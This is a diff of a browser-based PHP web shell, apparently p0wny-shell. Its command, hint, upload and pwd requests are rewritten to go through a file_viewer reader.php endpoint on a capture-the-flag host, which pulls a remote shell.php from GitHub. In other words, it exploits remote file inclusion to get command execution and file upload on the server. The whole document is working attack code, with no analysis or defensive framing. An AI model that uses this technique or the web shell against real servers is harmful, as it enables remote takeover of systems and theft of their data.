@@ -240,7 +240,7 @@ if (isset($_GET["feature"])) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
                 } else {
-                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
+                    makeRequest("https://file_viewer.tjctf.org/reader.php?file=https://raw.githubusercontent.com/oTwoWin/test/master/shell.php?token=AIN4EZVKH54K37BSB4KTVAC62K6OK?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
                             featureDownload(response.name, response.file)
                         } else {
@@ -275,7 +275,7 @@ if (isset($_GET["feature"])) {
                 var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];
 
                 makeRequest(
-                    "?feature=hint",
+                    "https://file_viewer.tjctf.org/reader.php?file=https://raw.githubusercontent.com/oTwoWin/test/master/shell.php?token=AIN4EZVKH54K37BSB4KTVAC62K6OK?feature=hint",
                     {
                         filename: fileName,
                         cwd: CWD,
@@ -305,7 +305,7 @@ if (isset($_GET["feature"])) {
                 element.addEventListener('change', function () {
                     var promise = getBase64(element.files[0]);
                     promise.then(function (file) {
-                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
+                        makeRequest('https://file_viewer.tjctf.org/reader.php?file=https://raw.githubusercontent.com/oTwoWin/test/master/shell.php?token=AIN4EZVKH54K37BSB4KTVAC62K6OK?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
                             _insertStdout(response.stdout.join("\n"));
                             updateCwd(response.cwd);
                         });
@@ -342,7 +342,7 @@ if (isset($_GET["feature"])) {
                     _updatePrompt();
                     return;
                 }
-                makeRequest("?feature=pwd", {}, function(response) {
+                makeRequest("https://file_viewer.tjctf.org/reader.php?file=https://raw.githubusercontent.com/oTwoWin/test/master/shell.php?token=AIN4EZVKH54K37BSB4KTVAC62K6OK?feature=pwd", {}, function(response) {
                     CWD = response.cwd;
                     _updatePrompt();
                 });
